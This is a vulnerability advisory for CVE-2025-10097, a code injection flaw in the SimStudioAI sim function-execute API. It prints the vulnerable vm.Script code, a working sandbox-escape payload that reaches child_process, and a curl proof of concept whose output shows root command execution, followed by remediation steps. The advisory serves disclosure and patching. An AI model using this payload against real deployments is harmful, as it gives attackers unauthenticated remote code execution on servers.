# CVE-2025-10097 Vulnerability Report

## Basic Information

- **CVE ID**: CVE-2025-10097
- **CWE ID**: CWE-94 (Improper Control of Generation of Code)
- **CVSS Score**: 9.8 (Critical)
- **Affected Product**: SimStudioAI sim
- **Affected Version**: <= 1.0.0
- **Vulnerability Type**: Remote Code Execution (RCE) via Code Injection

## Vulnerability Description

A code injection vulnerability exists in SimStudioAI sim versions up to 1.0.0. The vulnerable endpoint is `/api/function/execute` which accepts arbitrary JavaScript code through the `code` parameter without proper sanitization or sandboxing.

The application uses Node.js `vm.Script` to execute user-provided code in a supposedly isolated context. However, the sandbox can be escaped using constructor chain techniques to access the main Node.js process and execute arbitrary system commands.

## Vulnerable Code

File: `apps/sim/app/api/function/execute/route.ts`

The vulnerable code creates a VM context and executes user-controlled code:

```javascript
const context = createContext({
  params: executionParams,
  environmentVariables: envVars,
  console: { ... }
})

const script = new Script(`
  (async () => {
    try {
      ${resolvedCode}  // User-controlled code injected here
    } catch (error) {
      console.error(error);
      throw error;
    }
  })()
`)

result = await script.runInContext(context, {
  timeout,
  displayErrors: true,
})
```

## Exploitation

The attacker can escape the VM sandbox by accessing the constructor chain to reach the main process module:

```javascript
const proc = this.constructor.constructor('return process')();
const { execSync } = proc.mainModule.require('child_process');
return execSync('id').toString();
```

## Proof of Concept

```bash
curl -X POST http://localhost:3000/api/function/execute \
  -H "Content-Type: application/json" \
  -d '{
    "code": "const proc = this.constructor.constructor('\''return process'\'')(); const { execSync } = proc.mainModule.require('\''child_process'\''); return execSync('\''id'\'').toString();",
    "timeout": 5000
  }'
```

## Test Results

Command executed: `id`

Output:
```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## Impact

- **Confidentiality**: HIGH - Attackers can read any file on the server
- **Integrity**: HIGH - Attackers can modify or delete files
- **Availability**: HIGH - Attackers can crash the application or consume resources

An unauthenticated remote attacker can execute arbitrary commands on the server with the privileges of the application process (root in Docker environment).

## Remediation

1. Update to SimStudioAI sim version > 1.0.0
2. Implement proper code sandboxing using isolated-vm or similar libraries
3. Restrict API endpoint access with authentication
4. Use allowlisting for permitted operations

## References

- GitHub Issue: https://github.com/simstudioai/sim/issues/961
- Fix PR: https://github.com/simstudioai/sim/pull/1149
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-10097
